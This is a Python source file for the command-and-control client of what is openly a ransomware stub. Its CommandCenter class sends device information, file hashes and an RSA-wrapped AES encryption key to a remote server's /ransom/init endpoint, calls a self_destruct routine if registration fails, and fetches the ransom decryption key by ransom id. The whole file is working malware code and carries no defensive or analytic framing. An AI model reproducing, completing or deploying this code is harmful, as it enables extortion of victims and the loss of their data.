import requests
from typing import Dict, Any
from stub.crypt import AES, RSA
from stub.utils import DeviceInfo, self_destruct
from stub.types import RSA_PUBLIC_KEY, BASE_URL

__all__ = ["CommandCenter"]


class CommandCenter:
    """
    CommandCenter is the main class for the Command Center application.
    """

    def __init__(self, base_url: str = BASE_URL) -> None:
        self.session = requests.Session()
        self.session.headers.update(
            {
                "User-Agent": "Command Center/1.0",
            }
        )
        self.base_url = base_url
        self.AES = AES()
        self.RSA = RSA.from_keys(public_key_pem=RSA_PUBLIC_KEY)

    def init_ransom(self) -> Dict[str, Any]:
        url = f"{self.base_url}/ransom/init"
        info = DeviceInfo()
        payload = {
            "hashes": info.hashes(),
            "device_info": info.to_dict(),
            "encrypted_key": self.RSA.encrypt(self.AES.key),
        }

        response = self.session.post(url, json=payload)
        jresp = response.json()
        if response.status_code != 200 or not bool(jresp["success"]):
            self_destruct()
            return {}

        return jresp

    def get_key(self, ransom_id: str) -> Dict[str, Any]:
        url = f"{self.base_url}/ransom/key"
        info = DeviceInfo()
        payload = {
            "uuid": ransom_id,
            "hashes": info.hashes(),
        }

        response = self.session.post(url, json=payload)
        jresp = response.json()
        return jresp
